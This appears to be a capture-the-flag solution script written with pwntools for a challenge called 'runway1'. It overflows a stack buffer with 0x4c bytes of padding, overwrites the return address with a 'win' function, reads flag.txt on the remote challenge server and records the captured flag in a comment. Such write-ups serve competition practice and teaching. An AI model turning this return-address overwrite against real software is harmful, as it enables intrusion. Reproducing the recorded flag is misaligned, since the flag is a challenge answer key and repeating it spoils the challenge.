#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway1", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challs.pwnoh.io", 13401)

payload = b""
payload += b"A" * 0x4c
payload += p64(elf.sym["win"])

p.sendlineafter(b"food?\n", payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}
